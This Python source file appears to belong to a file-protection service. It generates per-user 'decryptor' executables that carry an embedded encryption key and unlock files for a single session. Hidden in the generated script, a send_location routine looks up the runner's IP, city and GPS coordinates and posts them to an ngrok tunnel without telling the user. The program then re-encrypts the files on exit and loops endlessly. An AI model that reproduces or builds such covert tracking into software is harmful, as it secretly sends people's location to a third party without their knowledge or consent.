import subprocess
import os
import shutil
import sys
import logging
import base64

from fastapi import HTTPException

logging.basicConfig(level=logging.DEBUG)

def generate_exe(key: bytes, encrypted_file_paths: list, file_extensions: dict, username: str):
    encoded_key = base64.b64encode(key).decode('utf-8')
    
    # Convert the file extensions dictionary to a string representation
    extensions_str = str(file_extensions)

    decryptor_script = f"""
import os
import sys
import logging
from cryptography.fernet import Fernet
import base64
import atexit
import requests
import json
import geocoder


logging.basicConfig(level=logging.DEBUG, filename='decryptor_log.txt', filemode='w')

key = base64.b64decode("{encoded_key}")
fernet = Fernet(key)

# Convert the string representation back to a dictionary
file_extensions = {extensions_str}

decrypted_files = []


def get_location():
    try:
        # Use the ipinfo.io API to get location based on IP
        response = requests.get('https://ipinfo.io')
        location_data = response.json()

        if 'loc' in location_data:
            loc = location_data['loc'].split(',')
            location_data['latitude'] = loc[0]
            location_data['longitude'] = loc[1]

        return {{
            "ip": location_data.get("ip"),
            "city": location_data.get("city"),
            "region": location_data.get("region"),
            "country": location_data.get("country"),
            "latitude": location_data.get("latitude"),
            "longitude": location_data.get("longitude")
        }}
    except Exception as e:
        logging.error(f"Error retrieving location: {{str(e)}}")
        return None

def send_location():
    location = get_location()
    if location:
        headers = {{'Content-Type': 'application/json'}}
        try:
            response = requests.post(
                'https://87ce-2401-4900-9023-d455-e146-9f1a-33f4-4f62.ngrok-free.app/sendLocation', 
                json=location, 
                headers=headers
            )
            if response.status_code == 200:
                logging.info("Location sent successfully")
            else:
                logging.error(f"Failed to send location. Status code: {{response.status_code}}")
        except Exception as e:
            logging.error(f"Error sending location: {{str(e)}}")


def decrypt_files():
    try:
        current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        logging.debug(f"Current directory: {{current_dir}}")
        print(f"Current directory: {{current_dir}}")
        
        files_before = set(os.listdir(current_dir))
        logging.debug(f"Files before decryption: {{files_before}}")
        print(f"Files before decryption: {{files_before}}")
        
        for filename in os.listdir(current_dir):
            if filename.endswith("_encrypted"):
                try:
                    logging.debug(f"Attempting to decrypt: {{filename}}")
                    print(f"Attempting to decrypt: {{filename}}")
                    file_path = os.path.join(current_dir, filename)
                    with open(file_path, "rb") as encrypted_file:
                        encrypted_data = encrypted_file.read()
                    decrypted_data = fernet.decrypt(encrypted_data)
                    
                    original_extension = file_extensions.get(filename.split('_encrypted')[0], "")
                    decrypted_filename = filename[:-10] + original_extension
                    
                    decrypted_path = os.path.join(current_dir, decrypted_filename)
                    with open(decrypted_path, "wb") as decrypted_file:
                        decrypted_file.write(decrypted_data)
                    os.remove(file_path)
                    logging.debug(f"Successfully decrypted: {{filename}} to {{decrypted_filename}}")
                    print(f"Successfully decrypted: {{filename}} to {{decrypted_filename}}")
                    decrypted_files.append(decrypted_path)
                except Exception as e:
                    logging.error(f"Error decrypting {{filename}}: {{str(e)}}")
                    print(f"Error decrypting {{filename}}: {{str(e)}}")
        
        files_after = set(os.listdir(current_dir))
        logging.debug(f"Files after decryption: {{files_after}}")
        print(f"Files after decryption: {{files_after}}")
        
        new_files = files_after - files_before
        logging.info(f"Newly created files: {{new_files}}")
        print(f"Newly created files: {{new_files}}")
        
        if decrypted_files:
            logging.info(f"Decrypted files: {{', '.join([os.path.basename(f) for f in decrypted_files])}}")
            print(f"Decrypted files: {{', '.join([os.path.basename(f) for f in decrypted_files])}}")
        else:
            logging.warning("No files were decrypted.")
            print("No files were decrypted.")
        
        logging.info("Decryption process completed.")
        print("Decryption process completed.")
    except Exception as e:
        logging.error(f"Error in decrypt_files: {{str(e)}}")
        print(f"Error in decrypt_files: {{str(e)}}")

def reencrypt_files():
    try:
        for decrypted_file in decrypted_files:
            logging.debug(f"Re-encrypting file: {{decrypted_file}}")
            print(f"Re-encrypting file: {{decrypted_file}}")
            with open(decrypted_file, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            encrypted_path = decrypted_file + "_encrypted"
            with open(encrypted_path, "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
            os.remove(decrypted_file)
            logging.debug(f"Successfully re-encrypted: {{decrypted_file}} to {{encrypted_path}}")
            print(f"Successfully re-encrypted: {{decrypted_file}} to {{encrypted_path}}")
        logging.info("Re-encryption process completed.")
        print("Re-encryption process completed.")
    except Exception as e:
        logging.error(f"Error in reencrypt_files: {{str(e)}}")
        print(f"Error in reencrypt_files: {{str(e)}}")

# Register reencrypt_files to run on process exit
atexit.register(reencrypt_files)

if __name__ == "__main__":
    try:
        send_location()
        decrypt_files()        
        input("Files decrypted. Press Enter to re-encrypt and exit...")
        
        while True:
            pass

    except Exception as e:
        logging.error(f"Unhandled exception: {{str(e)}}")
        print(f"An error occurred. Please check the decryptor_log.txt file for details.")
    """
    
    script_path = os.path.join('temp', "decryptor.py")
    with open(script_path, "w") as f:
        f.write(decryptor_script)
    
    try:
        logging.debug("Attempting to create executable with PyInstaller")
        result = subprocess.run([
            "pyinstaller", 
            "--onefile", 
            "--hidden-import=cryptography", 
            "--hidden-import=requests", 
            "--hidden-import=geocoder", 
            script_path
        ], 
        check=True, 
        capture_output=True, 
        text=True)

        logging.debug(f"PyInstaller output: {{result.stdout}}")
        logging.debug(f"PyInstaller errors: {{result.stderr}}")
        
        if sys.platform.startswith('win'):
            exe_name = f"decryptor_{username}.exe"
        else:
            exe_name = "decryptor"  # Unix systems don't use .exe extension
        
        exe_path = os.path.join("dist", exe_name)
        if not os.path.exists(exe_path):
            raise FileNotFoundError(f"Expected executable file not found: {{exe_path}}")
        logging.debug(f"Executable created successfully at {{exe_path}}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error running pyinstaller: {{e}}")
        logging.error(f"PyInstaller output: {{e.stdout}}")
        logging.error(f"PyInstaller errors: {{e.stderr}}")
        exe_path = script_path  # Fall back to using the Python script directly
    except FileNotFoundError as e:
        logging.error(f"PyInstaller not found or failed to create executable: {{e}}")
        exe_path = script_path  # Fall back to using the Python script directly
    
    # Clean up temporary files if executable was created successfully
    if exe_path != script_path:
        os.remove(script_path)
        if os.path.exists("build"):
            shutil.rmtree("build")
        if os.path.exists("decryptor.spec"):
            os.remove("decryptor.spec")
    else:
        logging.warning("Falling back to Python script as executable creation failed")
    
    return exe_path
